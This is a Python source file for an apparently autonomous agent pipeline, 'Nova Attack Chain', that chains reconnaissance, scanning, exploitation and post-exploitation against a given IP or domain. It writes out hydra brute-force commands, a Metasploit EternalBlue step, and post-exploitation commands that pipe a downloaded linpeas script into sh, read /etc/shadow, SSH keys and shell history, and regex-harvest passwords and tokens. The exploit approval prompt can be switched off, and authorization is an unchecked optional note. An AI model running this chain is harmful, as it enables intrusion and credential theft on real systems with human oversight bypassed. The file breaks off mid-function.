"""
NOVA ATTACK CHAIN
==================
Autonomous end-to-end attack pipeline for Nova.

Chains together:
1. Reconnaissance      → Information gathering
2. Scanning            → Port/service/vuln discovery
3. Exploitation        → Exploit confirmed vulnerabilities
4. Post-Exploitation   → Privilege escalation, lateral movement
5. Reporting           → Structured findings and evidence

Each phase feeds into the next automatically.
Nova decides the best path based on findings.

Integrates with:
- nova_kali_agent.py              (core execution)
- nova_performance_optimizer.py   (parallel execution)
- nova_result_parser.py           (structured findings)
- nova_multi_target_orchestrator.py (multi-target)
- nova_tool_dependency_manager.py (tool checking)
- nova_kali_knowledge_base.py     (tool selection)

Usage:
    from nova_attack_chain import NovaAttackChain

    chain = NovaAttackChain()

    # Full autonomous chain
    results = chain.run("192.168.1.1")

    # Specific phases only
    results = chain.run("192.168.1.1", phases=["recon", "scanning"])

    # From natural language
    results = chain.run_from_task("find all vulnerabilities on 192.168.1.1")
"""

import time
import json
import logging
import subprocess
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)

# ── Optional integrations ─────────────────────
try:
    from nova_performance_optimizer import NovaPerformanceOptimizer, ResourceBudget
    HAS_OPTIMIZER = True
except ImportError:
    HAS_OPTIMIZER = False

try:
    from nova_result_parser import NovaResultParser, Finding, Severity
    HAS_PARSER = True
except ImportError:
    HAS_PARSER = False

try:
    from nova_tool_dependency_manager import NovaToolDependencyManager
    HAS_DEP_MANAGER = True
except ImportError:
    HAS_DEP_MANAGER = False

try:
    from nova_kali_knowledge_base import KaliKnowledgeBase
    HAS_KB = True
except ImportError:
    HAS_KB = False


# ──────────────────────────────────────────────
# ENUMS
# ──────────────────────────────────────────────

class ChainPhase(str, Enum):
    RECON           = "recon"
    SCANNING        = "scanning"
    VULN_ANALYSIS   = "vuln_analysis"
    EXPLOITATION    = "exploitation"
    POST_EXPLOIT    = "post_exploitation"
    REPORTING       = "reporting"


class PhaseStatus(str, Enum):
    PENDING     = "PENDING"
    RUNNING     = "RUNNING"
    COMPLETED   = "COMPLETED"
    FAILED      = "FAILED"
    SKIPPED     = "SKIPPED"


class AttackVector(str, Enum):
    """Identified attack vectors from scanning phase"""
    OPEN_PORT           = "open_port"
    WEAK_CREDENTIALS    = "weak_credentials"
    VULNERABLE_SERVICE  = "vulnerable_service"
    WEB_VULNERABILITY   = "web_vulnerability"
    MISCONFIGURATION    = "misconfiguration"
    UNPATCHED_CVE       = "unpatched_cve"
    DEFAULT_CREDS       = "default_credentials"
    ANONYMOUS_ACCESS    = "anonymous_access"


# ──────────────────────────────────────────────
# DATA MODELS
# ──────────────────────────────────────────────

@dataclass
class AttackVector:
    """A potential attack path identified during scanning"""
    vector_type: str
    target: str
    port: Optional[int]
    service: str
    description: str
    severity: str
    tool_to_exploit: str
    exploit_command: str
    confidence: float  # 0.0 - 1.0
    cve: Optional[str] = None
    evidence: str = ""


@dataclass
class PhaseResult:
    """Results from a single attack chain phase"""
    phase: ChainPhase
    status: PhaseStatus
    target: str
    started_at: str = field(default_factory=lambda: datetime.now().isoformat())
    completed_at: Optional[str] = None
    duration_seconds: float = 0.0
    commands_run: List[str] = field(default_factory=list)
    raw_outputs: Dict[str, str] = field(default_factory=dict)
    findings: List[Any] = field(default_factory=list)
    attack_vectors: List[AttackVector] = field(default_factory=list)
    error: Optional[str] = None
    notes: str = ""

    def to_dict(self) -> Dict:
        return {
            "phase":            self.phase.value,
            "status":           self.status.value,
            "target":           self.target,
            "started_at":       self.started_at,
            "completed_at":     self.completed_at,
            "duration_seconds": self.duration_seconds,
            "commands_run":     self.commands_run,
            "findings_count":   len(self.findings),
            "attack_vectors":   len(self.attack_vectors),
            "error":            self.error,
            "notes":            self.notes,
        }


@dataclass
class ChainResult:
    """Full attack chain result across all phases"""
    target: str
    started_at: str = field(default_factory=lambda: datetime.now().isoformat())
    completed_at: Optional[str] = None
    total_duration: float = 0.0
    phases_run: List[PhaseResult] = field(default_factory=list)
    all_findings: List[Any] = field(default_factory=list)
    attack_vectors: List[AttackVector] = field(default_factory=list)
    exploited_vectors: List[AttackVector] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    discovered_services: Dict[int, str] = field(default_factory=dict)
    credentials_found: List[Dict] = field(default_factory=list)
    success: bool = False
    chain_summary: str = ""

    def to_dict(self) -> Dict:
        return {
            "target":               self.target,
            "started_at":           self.started_at,
            "completed_at":         self.completed_at,
            "total_duration":       self.total_duration,
            "phases_run":           [p.to_dict() for p in self.phases_run],
            "total_findings":       len(self.all_findings),
            "attack_vectors_found": len(self.attack_vectors),
            "vectors_exploited":    len(self.exploited_vectors),
            "open_ports":           self.open_ports,
            "services":             self.discovered_services,
            "credentials_found":    len(self.credentials_found),
            "success":              self.success,
            "summary":              self.chain_summary,
        }


# ──────────────────────────────────────────────
# PHASE EXECUTORS
# ──────────────────────────────────────────────

class ReconPhase:
    """
    Phase 1 — Reconnaissance
    Passive + active information gathering
    """

    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run

    def run(self, target: str) -> PhaseResult:
        result = PhaseResult(
            phase=ChainPhase.RECON,
            status=PhaseStatus.RUNNING,
            target=target
        )
        start = time.time()

        print(f"\n{'='*55}")
        print(f"[PHASE 1] RECONNAISSANCE → {target}")
        print(f"{'='*55}")

        commands = [
            f"whois {target}",
            f"dig {target} ANY +short",
            f"nslookup {target}",
            f"host {target}",
        ]

        # Add subdomain/domain recon if target is a domain
        if not self._is_ip(target):
            commands += [
                f"dnsrecon -d {target} -t std",
                f"sublist3r -d {target} -o /tmp/nova_subdomains.txt",
            ]

        for cmd in commands:
            print(f"  [+] {cmd}")
            output = self._run(cmd)
            result.commands_run.append(cmd)
            result.raw_outputs[cmd] = output

        result.status = PhaseStatus.COMPLETED
        result.completed_at = datetime.now().isoformat()
        result.duration_seconds = round(time.time() - start, 2)
        result.notes = f"Recon completed — {len(commands)} commands run"

        print(f"  [✓] Recon done in {result.duration_seconds}s")
        return result

    def _is_ip(self, target: str) -> bool:
        import re
        return bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target))

    def _run(self, cmd: str) -> str:
        if self.dry_run:
            return f"[DRY RUN] {cmd}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=30
            )
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"


class ScanningPhase:
    """
    Phase 2 — Scanning & Enumeration
    Discover open ports, services, and initial vulnerabilities
    """

    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run

    def run(self, target: str, fast: bool = False) -> PhaseResult:
        result = PhaseResult(
            phase=ChainPhase.SCANNING,
            status=PhaseStatus.RUNNING,
            target=target
        )
        start = time.time()

        print(f"\n{'='*55}")
        print(f"[PHASE 2] SCANNING → {target}")
        print(f"{'='*55}")

        # Initial fast scan
        fast_cmd = f"nmap -T4 --open -Pn {target}"
        print(f"  [+] Fast scan: {fast_cmd}")
        fast_output = self._run(fast_cmd)
        result.commands_run.append(fast_cmd)
        result.raw_outputs[fast_cmd] = fast_output

        # Parse open ports from fast scan
        open_ports = self._parse_open_ports(fast_output)
        print(f"  [*] Open ports found: {open_ports}")

        if open_ports:
            # Detailed service scan on open ports
            ports_str = ",".join(map(str, open_ports))
            detail_cmd = f"nmap -sV -sC -p {ports_str} {target} -oX /tmp/nova_scan_{target.replace('.','_')}.xml"
            print(f"  [+] Service scan: {detail_cmd}")
            detail_output = self._run(detail_cmd)
            result.commands_run.append(detail_cmd)
            result.raw_outputs[detail_cmd] = detail_output

            # Run targeted enumeration based on discovered services
            services = self._parse_services(detail_output)
            enum_commands = self._get_enum_commands(target, open_ports, services)

            for cmd in enum_commands:
                print(f"  [+] {cmd}")
                output = self._run(cmd)
                result.commands_run.append(cmd)
                result.raw_outputs[cmd] = output

            # Extract attack vectors
            result.attack_vectors = self._identify_attack_vectors(
                target, open_ports, services, detail_output
            )
            result.open_ports = open_ports

        result.status = PhaseStatus.COMPLETED
        result.completed_at = datetime.now().isoformat()
        result.duration_seconds = round(time.time() - start, 2)
        result.notes = f"Found {len(open_ports)} open ports, {len(result.attack_vectors)} attack vectors"

        print(f"  [✓] Scanning done in {result.duration_seconds}s")
        print(f"  [*] Attack vectors: {len(result.attack_vectors)}")
        return result

    def _parse_open_ports(self, nmap_output: str) -> List[int]:
        import re
        ports = []
        for match in re.finditer(r'(\d+)/tcp\s+open', nmap_output):
            ports.append(int(match.group(1)))
        return ports

    def _parse_services(self, nmap_output: str) -> Dict[int, str]:
        import re
        services = {}
        for match in re.finditer(r'(\d+)/tcp\s+open\s+(\S+)', nmap_output):
            services[int(match.group(1))] = match.group(2)
        return services

    def _get_enum_commands(self, target: str, ports: List[int], services: Dict) -> List[str]:
        """Get enumeration commands based on discovered services"""
        commands = []

        for port, service in services.items():
            service_lower = service.lower()

            if service_lower in ("http", "http-alt", "http-proxy") or port in (80, 8080, 8000, 8443):
                commands.append(f"whatweb http://{target}:{port}")
                commands.append(f"nikto -h {target} -p {port} -maxtime 60")

            elif service_lower == "https" or port == 443:
                commands.append(f"whatweb https://{target}")
                commands.append(f"sslscan {target}:{port}")

            elif service_lower == "smb" or port in (139, 445):
                commands.append(f"enum4linux -a {target}")
                commands.append(f"smbmap -H {target}")

            elif service_lower == "ftp" or port == 21:
                commands.append(f"nmap -p 21 --script ftp-anon,ftp-bounce {target}")

            elif service_lower == "ssh" or port == 22:
                commands.append(f"nmap -p 22 --script ssh-auth-methods,ssh-hostkey {target}")

            elif service_lower == "smtp" or port == 25:
                commands.append(f"smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t {target}")

            elif service_lower == "snmp" or port == 161:
                commands.append(f"snmpwalk -v 2c -c public {target}")
                commands.append(f"onesixtyone {target} public")

            elif service_lower in ("mysql", "ms-sql-s") or port in (3306, 1433):
                commands.append(f"nmap -p {port} --script mysql-info,ms-sql-info {target}")

            elif service_lower == "rdp" or port == 3389:
                commands.append(f"nmap -p 3389 --script rdp-enum-encryption {target}")

        return commands

    def _identify_attack_vectors(
        self,
        target: str,
        ports: List[int],
        services: Dict[int, str],
        scan_output: str
    ) -> List[AttackVector]:
        """Identify exploitable attack vectors from scan results"""
        vectors = []

        # Check for risky services
        risky_services = {
            21:   ("ftp",   "FTP service exposed",              "hydra",    f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{target}", 0.7),
            22:   ("ssh",   "SSH service exposed",              "hydra",    f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target}", 0.5),
            23:   ("telnet","Telnet service — unencrypted",     "hydra",    f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://{target}", 0.9),
            25:   ("smtp",  "SMTP service exposed",             "swaks",    f"swaks --to test@{target} --server {target}", 0.6),
            80:   ("http",  "HTTP web server",                  "nikto",    f"nikto -h {target}", 0.6),
            443:  ("https", "HTTPS web server",                 "nikto",    f"nikto -h {target} -ssl", 0.6),
            445:  ("smb",   "SMB exposed — potential EternalBlue", "metasploit", f"use exploit/windows/smb/ms17_010_eternalblue", 0.8),
            3306: ("mysql", "MySQL exposed",                    "sqlmap",   f"sqlmap -d mysql://root@{target}/", 0.7),
            3389: ("rdp",   "RDP exposed — brute force risk",   "hydra",    f"hydra -L users.txt -P passwords.txt rdp://{target}", 0.8),
            6379: ("redis", "Redis exposed — likely unauth",    "redis-cli",f"redis-cli -h {target} INFO", 0.9),
            27017:("mongodb","MongoDB exposed — likely unauth", "mongo",    f"mongo {target}:27017", 0.9),
            2375: ("docker","Docker API exposed — CRITICAL",    "curl",     f"curl http://{target}:2375/info", 0.95),
        }

        for port in ports:
            if port in risky_services:
                svc, desc, tool, cmd, confidence = risky_services[port]
                vectors.append(AttackVector(
                    vector_type="open_port",
                    target=target,
                    port=port,
                    service=svc,
                    description=desc,
                    severity="HIGH" if confidence > 0.7 else "MEDIUM",
                    tool_to_exploit=tool,
                    exploit_command=cmd,
                    confidence=confidence
                ))

        # Check for anonymous FTP
        if "Anonymous FTP login allowed" in scan_output:
            vectors.append(AttackVector(
                vector_type="anonymous_access",
                target=target,
                port=21,
                service="ftp",
                description="Anonymous FTP login allowed",
                severity="HIGH",
                tool_to_exploit="ftp",
                exploit_command=f"ftp {target}",
                confidence=1.0,
                evidence="nmap ftp-anon script confirmed"
            ))

        # Check for EternalBlue
        if "MS17-010" in scan_output or "VULNERABLE" in scan_output:
            vectors.append(AttackVector(
                vector_type="unpatched_cve",
                target=target,
                port=445,
                service="smb",
                description="EternalBlue MS17-010 vulnerability detected",
                severity="CRITICAL",
                tool_to_exploit="metasploit",
                exploit_command="use exploit/windows/smb/ms17_010_eternalblue",
                confidence=0.95,
                cve="CVE-2017-0144",
                evidence="nmap smb-vuln-ms17-010 confirmed"
            ))

        return sorted(vectors, key=lambda v: v.confidence, reverse=True)

    def _run(self, cmd: str) -> str:
        if self.dry_run:
            return f"[DRY RUN] {cmd}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=120
            )
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"


class VulnAnalysisPhase:
    """
    Phase 3 — Vulnerability Analysis
    Deep vulnerability assessment on discovered services
    """

    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run

    def run(self, target: str, attack_vectors: List[AttackVector], open_ports: List[int]) -> PhaseResult:
        result = PhaseResult(
            phase=ChainPhase.VULN_ANALYSIS,
            status=PhaseStatus.RUNNING,
            target=target
        )
        start = time.time()

        print(f"\n{'='*55}")
        print(f"[PHASE 3] VULNERABILITY ANALYSIS → {target}")
        print(f"{'='*55}")

        # NSE vuln scripts
        if open_ports:
            ports_str = ",".join(map(str, open_ports[:20]))  # Top 20 ports
            vuln_cmd = f"nmap -sV --script vuln -p {ports_str} {target}"
            print(f"  [+] {vuln_cmd}")
            output = self._run(vuln_cmd)
            result.commands_run.append(vuln_cmd)
            result.raw_outputs[vuln_cmd] = output

            # Check for heartbleed if 443 open
            if 443 in open_ports:
                ssl_cmd = f"sslscan {target}:443"
                print(f"  [+] {ssl_cmd}")
                ssl_out = self._run(ssl_cmd)
                result.commands_run.append(ssl_cmd)
                result.raw_outputs[ssl_cmd] = ssl_out

            # Web vuln scanning if web ports open
            web_ports = [p for p in open_ports if p in (80, 443, 8080, 8443, 8000)]
            for port in web_ports[:2]:
                proto = "https" if port in (443, 8443) else "http"
                web_cmd = f"nikto -h {proto}://{target}:{port} -maxtime 120"
                print(f"  [+] {web_cmd}")
                web_out = self._run(web_cmd)
                result.commands_run.append(web_cmd)
                result.raw_outputs[web_cmd] = web_out

                # Directory enumeration
                dir_cmd = f"gobuster dir -u {proto}://{target}:{port} -w /usr/share/wordlists/dirb/common.txt -q -t 20"
                print(f"  [+] {dir_cmd}")
                dir_out = self._run(dir_cmd)
                result.commands_run.append(dir_cmd)
                result.raw_outputs[dir_cmd] = dir_out

        result.status = PhaseStatus.COMPLETED
        result.completed_at = datetime.now().isoformat()
        result.duration_seconds = round(time.time() - start, 2)
        result.notes = f"Vuln analysis complete — {len(result.commands_run)} checks run"

        print(f"  [✓] Vuln analysis done in {result.duration_seconds}s")
        return result

    def _run(self, cmd: str) -> str:
        if self.dry_run:
            return f"[DRY RUN] {cmd}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=180
            )
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"


class ExploitationPhase:
    """
    Phase 4 — Exploitation
    Attempt to exploit identified attack vectors
    REQUIRES explicit user approval per vector
    """

    def __init__(self, dry_run: bool = False, require_approval: bool = True):
        self.dry_run = dry_run
        self.require_approval = require_approval

    def run(
        self,
        target: str,
        attack_vectors: List[AttackVector],
        auto_approve: bool = False
    ) -> PhaseResult:
        result = PhaseResult(
            phase=ChainPhase.EXPLOITATION,
            status=PhaseStatus.RUNNING,
            target=target
        )
        start = time.time()

        print(f"\n{'='*55}")
        print(f"[PHASE 4] EXPLOITATION → {target}")
        print(f"{'='*55}")

        if not attack_vectors:
            print("  [!] No attack vectors to exploit")
            result.status = PhaseStatus.SKIPPED
            result.notes = "No attack vectors available"
            result.duration_seconds = round(time.time() - start, 2)
            return result

        # Sort by confidence — highest first
        vectors = sorted(attack_vectors, key=lambda v: v.confidence, reverse=True)

        exploited = []

        for vector in vectors:
            print(f"\n  [VECTOR] {vector.description}")
            print(f"           Port: {vector.port} | Confidence: {vector.confidence:.0%}")
            print(f"           Tool: {vector.tool_to_exploit}")
            print(f"           Cmd:  {vector.exploit_command}")

            # Approval gate
            approved = auto_approve
            if self.require_approval and not auto_approve:
                try:
                    answer = input(f"\n  Attempt exploitation? [y/N]: ").strip().lower()
                    approved = answer in ("y", "yes")
                except (EOFError, KeyboardInterrupt):
                    approved = False

            if not approved:
                print(f"  [SKIP] Skipped by user")
                continue

            # Execute
            print(f"  [*] Executing exploit...")
            output = self._run(vector.exploit_command)
            result.commands_run.append(vector.exploit_command)
            result.raw_outputs[vector.exploit_command] = output

            # Check for success indicators
            if self._check_success(output, vector):
                print(f"  [+] EXPLOITATION SUCCESSFUL: {vector.description}")
                exploited.append(vector)
                result.attack_vectors.append(vector)
            else:
                print(f"  [-] Exploitation did not succeed")

        result.status = PhaseStatus.COMPLETED
        result.completed_at = datetime.now().isoformat()
        result.duration_seconds = round(time.time() - start, 2)
        result.notes = f"Attempted {len(result.commands_run)} exploits, {len(exploited)} successful"

        print(f"\n  [✓] Exploitation phase done — {len(exploited)}/{len(vectors)} vectors exploited")
        return result

    def _check_success(self, output: str, vector: AttackVector) -> bool:
        """Check if exploitation was successful based on output"""
        success_indicators = [
            "session", "shell", "meterpreter", "whoami",
            "successfully", "logged in", "authenticated",
            "root", "administrator", "connected"
        ]
        output_lower = output.lower()
        return any(ind in output_lower for ind in success_indicators)

    def _run(self, cmd: str) -> str:
        if self.dry_run:
            time.sleep(0.1)
            return f"[DRY RUN] Simulated execution of: {cmd}\nsession 1 opened (simulated)"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=60
            )
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"


class PostExploitPhase:
    """
    Phase 5 — Post-Exploitation
    Escalate privileges, gather credentials, lateral movement
    """

    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run

    def run(self, target: str, exploited_vectors: List[AttackVector]) -> PhaseResult:
        result = PhaseResult(
            phase=ChainPhase.POST_EXPLOIT,
            status=PhaseStatus.RUNNING,
            target=target
        )
        start = time.time()

        print(f"\n{'='*55}")
        print(f"[PHASE 5] POST-EXPLOITATION → {target}")
        print(f"{'='*55}")

        if not exploited_vectors:
            print("  [!] No successful exploits to post-exploit from")
            result.status = PhaseStatus.SKIPPED
            result.notes = "No successful exploits"
            result.duration_seconds = round(time.time() - start, 2)
            return result

        # Run linpeas/winpeas for privesc
        privesc_commands = [
            f"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null || echo 'linpeas not available'",
        ]

        # Credential hunting
        cred_commands = [
            "find / -name '*.conf' -readable 2>/dev/null | head -20",
            "find / -name '*.cfg' -readable 2>/dev/null | head -10",
            "find / -name 'id_rsa' -readable 2>/dev/null",
            "cat /etc/passwd 2>/dev/null",
            "cat /etc/shadow 2>/dev/null",
            "history 2>/dev/null || cat ~/.bash_history 2>/dev/null",
            "env 2>/dev/null",
            "find / -perm -4000 2>/dev/null",  # SUID binaries
        ]

        all_commands = privesc_commands + cred_commands

        for cmd in all_commands:
            print(f"  [+] {cmd[:60]}...")
            output = self._run(cmd)
            result.commands_run.append(cmd)
            result.raw_outputs[cmd] = output

            # Extract credentials from output
            creds = self._extract_credentials(output)
            if creds:
                result.findings.extend(creds)
                print(f"  [!] Potential credentials found!")

        result.status = PhaseStatus.COMPLETED
        result.completed_at = datetime.now().isoformat()
        result.duration_seconds = round(time.time() - start, 2)
        result.notes = f"Post-exploit complete — {len(result.findings)} credential hints found"

        print(f"  [✓] Post-exploitation done in {result.duration_seconds}s")
        return result

    def _extract_credentials(self, output: str) -> List[Dict]:
        """Extract potential credentials from output"""
        import re
        creds = []

        # Password patterns
        patterns = [
            r'password["\s:=]+([^\s"\']+)',
            r'passwd["\s:=]+([^\s"\']+)',
            r'pass["\s:=]+([^\s"\']+)',
            r'secret["\s:=]+([^\s"\']+)',
            r'api_key["\s:=]+([^\s"\']+)',
            r'token["\s:=]+([^\s"\']+)',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                if len(match) > 3 and match not in ("true", "false", "null", "none"):
                    creds.append({
                        "type": "credential_hint",
                        "value": match[:50],
                        "pattern": pattern
                    })

        return creds

    def _run(self, cmd: str) -> str:
        if self.dry_run:
            return f"[DRY RUN] {cmd}"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=60
            )
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {e}"


class ReportingPhase:
    """
    Phase 6 — Reporting
    Generate structured findings report
    """

    def run(self, chain_result: 'ChainResult') -> PhaseResult:
        result = PhaseResult(
            phase=ChainPhase.REPORTING,
            status=PhaseStatus.RUNNING,
            target=chain_result.target
        )
        start = time.time()

        print(f"\n{'='*55}")
        print(f"[PHASE 6] REPORTING → {chain_result.target}")
        print(f"{'='*55}")

        # Generate summary
        summary = self._generate_summary(chain_result)
        chain_result.chain_summary = summary

        # Export JSON report
        report_path = f"/tmp/nova_report_{chain_result.target.replace('.','_')}_{int(time.time())}.json"
        with open(report_path, "w") as f:
            json.dump(chain_result.to_dict(), f, indent=2)

        print(f"  [+] Report saved: {report_path}")
        print(f"\n{summary}")

        result.status = PhaseStatus.COMPLETED
        result.completed_at = datetime.now().isoformat()
        result.duration_seconds = round(time.time() - start, 2)
        result.notes = f"Report saved to {report_path}"

        return result

    def _generate_summary(self, chain_result: 'ChainResult') -> str:
        lines = [
            "=" * 55,
            "NOVA ATTACK CHAIN — FINAL REPORT",
            "=" * 55,
            f"Target          : {chain_result.target}",
            f"Duration        : {chain_result.total_duration:.1f}s",
            f"Phases Run      : {len(chain_result.phases_run)}",
            f"Open Ports      : {chain_result.open_ports}",
            f"Attack Vectors  : {len(chain_result.attack_vectors)}",
            f"Vectors Exploited: {len(chain_result.exploited_vectors)}",
            f"Credentials Found: {len(chain_result.credentials_found)}",
            "",
        ]

        if chain_result.attack_vectors:
            lines.append("ATTACK VECTORS FOUND:")
            for v in chain_result.attack_vectors:
                lines.append(f"  [{v.severity}] {v.description} (port {v.port})")

        if chain_result.exploited_vectors:
            lines.append("\nSUCCESSFUL EXPLOITS:")
            for v in chain_result.exploited_vectors:
                lines.append(f"  [+] {v.description}")

        lines.append("=" * 55)
        return "\n".join(lines)


# ──────────────────────────────────────────────
# MAIN ATTACK CHAIN
# ──────────────────────────────────────────────

class NovaAttackChain:
    """
    Autonomous end-to-end attack chain.

    Connects all Nova modules into a single pipeline:
    Recon → Scan → Vuln Analysis → Exploit → Post-Exploit → Report

    Each phase feeds intelligence into the next.
    Nova decides the attack path based on findings.

    Example:
        chain = NovaAttackChain(dry_run=True)

        # Full chain
        result = chain.run("192.168.1.1")

        # Selected phases
        result = chain.run("192.168.1.1", phases=["recon", "scanning"])

        # From natural language
        result = chain.run_from_task("test 192.168.1.1 for web vulnerabilities")
    """

    def __init__(
        self,
        dry_run: bool = False,
        require_exploit_approval: bool = True,
        auto_exploit: bool = False,
        max_workers: int = 4
    ):
        self.dry_run = dry_run
        self.require_exploit_approval = require_exploit_approval
        self.auto_exploit = auto_exploit
        self.max_workers = max_workers

        # Initialize phase executors
        self.recon_phase      = ReconPhase(dry_run)
        self.scanning_phase   = ScanningPhase(dry_run)
        self.vuln_phase       = VulnAnalysisPhase(dry_run)
        self.exploit_phase    = ExploitationPhase(dry_run, require_exploit_approval)
        self.postexploit_phase= PostExploitPhase(dry_run)
        self.reporting_phase  = ReportingPhase()

        # Optional integrations
        if HAS_PARSER:
            self.parser = NovaResultParser()
        if HAS_KB:
            self.kb = KaliKnowledgeBase()
        if HAS_DEP_MANAGER:
            self.dep_manager = NovaToolDependencyManager(verbose=False)

        logger.info(
            f"NovaAttackChain initialized — "
            f"dry_run={dry_run}, auto_exploit={auto_exploit}"
        )

    def run(
        self,
        target: str,
        phases: Optional[List[str]] = None,
        authorization_note: str = ""
    ) -> ChainResult:
        """
        Run the full attack chain against a target.

        Args:
            target:             IP address or hostname
            phases:             List of phases to run (default: all)
                                Options: recon, scanning, vuln_analysis,
                                         exploitation, post_exploitation, reporting
            authorization_note: Who authorized this test

        Returns:
            ChainResult with all findings
        """

        all_phases = [
            "recon", "scanning", "vuln_analysis",
            "exploitation", "post_exploitation", "reporting"
        ]
        phases_to_run = phases or all_phases

        chain_result = ChainResult(target=target)
        start_time = time.time()

        print(f"\n{'#'*55}")
        print(f"# NOVA ATTACK CHAIN")
        print(f"# Target : {target}")
        print(f"# Phases : {', '.join(phases_to_run)}")
        print(f"# Dry Run: {self.dry_run}")
        if authorization_note:
            print(f"# Auth   : {authorization_note}")
        print(f"{'#'*55}")

        # Check tool dependencies
        if HAS_DEP_MANAGER and not self.dry_run:
            self._check_dependencies(phases_to_run)

        # ── Phase 1: Recon ─────────────────────
        if "recon" in phases_to_run:
            phase_result = self.recon_phase.run(target)
            chain_result.phases_run.append(phase_result)

        # ── Phase 2: Scanning ──────────────────
        if "scanning" in phases_to_run:
            phase_result = self.scanning_phase.run(target)
            chain_result.phases_run.append(phase_result)
            chain_result.open_ports = phase_result.open_ports if hasattr(phase_result, 'open_ports') else []
            chain_result.attack_vectors.extend(phase_result.attack_vectors)
            chain_result.discovered_services = self._extract_services(phase_result)

            # Parse findings if parser available
            if HAS_PARSER:
                for cmd, output in phase_result.raw_outputs.items():
                    tool = cmd.split()[0]
                    findings = self.parser.parse(tool, output, target=target)
                    chain_result.all_findings.extend(findings)

        # ── Phase 3: Vuln Analysis ─────────────
        if "vuln_analysis" in phases_to_run:
            phase_result = self.vuln_phase.run(
                target,
                chain_result.attack_vectors,
                chain_result.open_ports
            )
            chain_result.phases_run.append(phase_result)

            if HAS_PARSER:
                for cmd, output in phase_result.raw_outputs.items():
                    tool = cmd.split()[0]
                    findings = self.parser.parse(tool, output, target=target)
                    chain_result.all_findings.extend(findings)

        # ── Phase 4: Exploitation ──────────────
        if "exploitation" in phases_to_run and chain_result.attack_vectors:
            phase_result = self.exploit_phase.run(
                target,
                chain_result.attack_vectors,
                auto_approve=self.auto_exploit
            )
            chain_result.phases_run.append(phase_result)
            chain_result.exploited_vectors = phase_result.attack_vectors

        # ── Phase 5: Post-Exploitation ─────────
        if "post_exploitation" in phases_to_run and chain_result.exploited_vectors:
            phase_result = self.postexploit_phase.run(
                target,
                chain_result.exploited_vectors
            )
            chain_result.phases_run.append(phase_result)
            chain_result.credentials_found = [
                f for f in phase_result.findings
                if isinstance(f, dict) and f.get("type") == "credential_hint"
            ]

        # ── Phase 6: Reporting ─────────────────
        if "reporting" in phases_to_run:
            chain_result.total_duration = round(time.time() - start_time, 2)
            chain_result.completed_at = datetime.now().isoformat()
            chain_result.success = len(chain_result.exploited_vectors) > 0 or len(chain_result.attack_vectors) > 0

            phase_result = self.reporting_phase.run(chain_result)
            chain_result.phases_run.append(phase_result)

        chain_result.total_duration = round(time.time() - start_time, 2)
        chain_result.completed_at = datetime.now().isoformat()

        return chain_result

    def run_from_task(self, task_description: str, authorization_note: str = "") -> Optional[ChainResult]:
        """
        Run attack chain from natural language task description.

        Extracts target and determines which phases to run.

        Args:
            task_description: e.g. "test 192.168.1.1 for web vulnerabilities"
            authorization_note: Who authorized this test

        Returns:
            ChainResult or None if target not found
        """
        import re

        # Extract target from description
        target = None

        # Try IP first
        ip_match = re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', task_description)
        if ip_match:
            target = ip_match.group(0)

        # Try domain
        if not target:
            domain_match = re.search(
                r'(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}',
                task_description.lower()
            )
            if domain_match:
                target = domain_match.group(0)

        if not target:
            print("[!] Could not extract target from task description")
            print("    Please specify an IP or domain")
            return None

        # Determine phases from task
        phases = self._phases_from_task(task_description)

        print(f"[*] Task: {task_description}")
        print(f"[*] Target extracted: {target}")
        print(f"[*] Phases: {phases}")

        return self.run(target, phases=phases, authorization_note=authorization_note)

    def quick_scan(self, target: str) -> ChainResult:
        """Quick recon + scanning only — no exploitation"""
        return self.run(target, phases=["recon", "scanning", "vuln_analysis", "reporting"])

    def full_chain(self, target: str, authorization_note: str = "") -> ChainResult:
        """Full autonomous chain including exploitation"""
        return self.run(target, authorization_note=authorization_note)

    def web_chain(self, target: str) -> ChainResult:
        """Web application focused chain"""
        return self.run(
            target,
            phases=["recon", "scanning", "vuln_analysis", "reporting"]
        )

    # ── Internal helpers ──────────────────────

    def _phases_from_task(self, task: str) -> List[str]:
        """Determine phases to run from task description"""
        task_lower = task.lower()

        # Full chain keywords
        if any(k in task_lower for k in ["full", "everything", "all", "complete", "pentest"]):
            return ["recon", "scanning", "vuln_analysis", "exploitation", "post_exploitation", "reporting"]

        # Recon only
        if any(k in task_lower for k in ["recon", "osint", "gather", "information"]):
            return ["recon", "reporting"]

        # Scanning
        if any(k in task_lower for k in ["scan", "port", "service", "enumerate"]):
            return ["recon", "scanning", "vuln_analysis", "reporting"]

        # Web focused
        if any(k in task_lower for k in ["web", "http", "https", "website", "application"]):
            return ["recon", "scanning", "vuln_analysis", "reporting"]

        # Exploitation
        if any(k in task_lower for k in ["exploit", "hack", "attack", "compromise"]):
